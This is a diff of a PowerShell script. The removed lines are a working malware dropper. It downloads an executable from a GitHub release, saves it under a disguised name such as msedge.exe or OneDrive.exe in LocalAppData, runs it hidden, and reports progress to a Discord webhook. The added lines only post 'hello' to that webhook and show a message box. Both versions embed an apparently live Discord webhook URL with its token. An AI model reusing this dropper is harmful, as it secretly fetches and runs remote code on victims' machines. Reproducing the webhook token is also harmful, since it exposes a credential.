@@ -1,45 +1,11 @@
-$webhookUrl = 'https://discord.com/api/webhooks/1433909453215895633/65nCYDENhbIopI5vyqig-GbrPkTJVsdBh-PLhnPawm0OrPGV0T_48Brv4pBLePmsVBLZ'
-
-function Send-WebhookMessage {
-    param (
-        [Parameter(Mandatory=$true)]
-        [string]$Message
-    )
-    $client = [System.Net.Http.HttpClient]::new()
-    $payload = @{ content = $Message } | ConvertTo-Json
-    $content = [System.Net.Http.StringContent]::new($payload, [System.Text.Encoding]::UTF8, 'application/json')
-    try {
-        $client.PostAsync($webhookUrl, $content).GetAwaiter().GetResult() | Out-Null
-    } catch {}
-    $client.Dispose()
-}
-
-Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$webhook = 'https://discord.com/api/webhooks/1433909453215895633/65nCYDENhbIopI5vyqig-GbrPkTJVsdBh-PLhnPawm0OrPGV0T_48Brv4pBLePmsVBLZ'
+$body = @{ content = 'hello' } | ConvertTo-Json
 try {
-    $programFiles = "C:\Program Files"
-    $tempFolder = $env:TEMP
-    $appDataFolder = $env:APPDATA
-    $localAppDataFolder = $env:LOCALAPPDATA
-    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
-    $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
-
-    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
-    $selectedExe = $exeNames | Get-Random
-    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
-
-    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
-    try {
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
-        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
-        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-        Send-WebhookMessage -Message "Executed $selectedExe"
-    } catch {
-        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
-        Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
-    }
-    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show('Sent','Success',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
 } catch {
-    $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
-    Send-WebhookMessage -Message "Unexpected error: $errorMessage"
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show("Failed to send.`n$($_.Exception.Message)","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
 }
